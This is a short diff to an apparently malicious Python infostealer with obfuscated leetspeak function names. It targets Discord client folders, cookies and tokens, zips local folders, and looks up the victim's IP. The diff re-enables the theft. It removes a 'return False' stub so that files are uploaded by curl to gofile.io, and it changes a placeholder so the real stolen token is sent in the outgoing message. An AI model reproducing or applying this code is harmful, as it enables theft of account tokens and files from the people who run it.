@@ -1106,8 +1106,8 @@ class DATA_BLOB(Structure):
     ]
 
 def G371P():
-    try:return urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except:return "None"
+    try: return urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except: return "None"
 
 def Z1PF01D3r(foldername, target_dir):            
     zipobj = ZipFile(temp+"/"+foldername + ".zip", "w", ZIP_DEFLATED)
@@ -1183,7 +1183,6 @@ def TrU57(C00K13s):
     return DETECTED
 
 def inj3c710n():
-
     username = os.getlogin()
 
     folder_list = ["Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment"]
@@ -1428,8 +1427,7 @@ def UP104D70K3N(token, path):
             "fields": [
                 {
                     "name": "<:hackerblack:1095747410539593800> Token:",
-                    "value": f"||`token`||" # REMOVE THIS
-                    #"value": f"||`{token}`||"
+                    "value": f"||`{token}`||"
                 },
                 {
                     "name": "<:mail:1095741024678191114> Email:",
@@ -2000,7 +1998,6 @@ def G47H3r411():
         thread.join()
     
 def UP104D7060F113(path):
-    return False # REMOVE THIS
     try:
         r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
         return loads(r[0].decode("utf-8"))["data"]["downloadPage"]
